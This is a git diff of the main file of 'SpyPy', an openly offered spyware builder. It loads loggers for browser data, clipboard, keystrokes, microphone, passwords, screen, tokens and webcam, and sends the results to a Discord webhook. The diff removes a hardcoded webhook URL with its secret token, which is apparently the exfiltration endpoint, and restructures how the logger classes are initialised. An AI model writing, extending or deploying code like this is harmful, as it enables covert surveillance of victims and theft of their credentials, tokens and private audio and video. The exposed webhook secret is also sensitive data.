@@ -1,5 +1,5 @@
 # SpyPy
-# This file can be ran by either building the project or running it directly.
+# Running this file directly will not work as of right now. Please see line 58 to understand why.
 # Feel free to modify this project as you wish. Contributions are always welcome.
 
 #TODO: Make all of the loggers actually work
@@ -23,7 +23,7 @@ from loggers.webcam_logger import WebcamLogger
 ######################################################
 # These variables will be configured by the builder. #
 # Please do not modify them to avoid any issues.     #
-WEBHOOK_URL = "https://discord.com/api/webhooks/1259249292296589444/krGfdyPsm4_USB87q6gOTTxqLQ_2puJgJABnqFyDbR5qMSEfTcmHYiBiCmu9d7UNQMsj"                                     #
+WEBHOOK_URL = ""                                     #
 SOFTWARE_EXE_NAME = ""                               #
 SOFTWARE_DIR_NAME = ""                               #
 CUSTOM_ERROR_MESSAGE = None                          #
@@ -58,6 +58,7 @@ class SpyPy:
         '''
         TODO important
 
+        the main.py currently does not run if you try to run it directly because of the way that this works...
         make it so that the logger classes are initialized like this:
         self.loggers = [
             BrowserLogger(),
@@ -70,14 +71,28 @@ class SpyPy:
         '''
 
         self.loggers = []
-        logger_names = ["BrowserLogger", "ClipboardLogger", "InputLogger", "MicrophoneLogger", "PasswordLogger", "ScreenLogger", "TokenLogger", "WebcamLogger"]
-        for logger_name in logger_names:
-            if not globals().get(logger_name):
-                continue
-            self.loggers.append(globals().get(logger_name)())
-            # awesome sauce
-        self.threads = []
+        try:
+            if is_built:
+                logger_names = ["BrowserLogger", "ClipboardLogger", "InputLogger", "MicrophoneLogger", "PasswordLogger", "ScreenLogger", "TokenLogger", "WebcamLogger"]
+                for logger_name in logger_names:
+                    if not globals().get(logger_name):
+                        continue
+                    self.loggers.append(globals().get(logger_name)())
+                
+                self.threads = []
+        except NameError:
+            self.loggers = [
+                BrowserLogger(),
+                ClipboardLogger(),
+                InputLogger(),
+                MicrophoneLogger(),
+                PasswordLogger(),
+                ScreenLogger(),
+                TokenLogger(),
+                WebcamLogger()
+            ]
 
+        self.threads = []
     def start(self):
         for logger in self.loggers:
             if not logger:
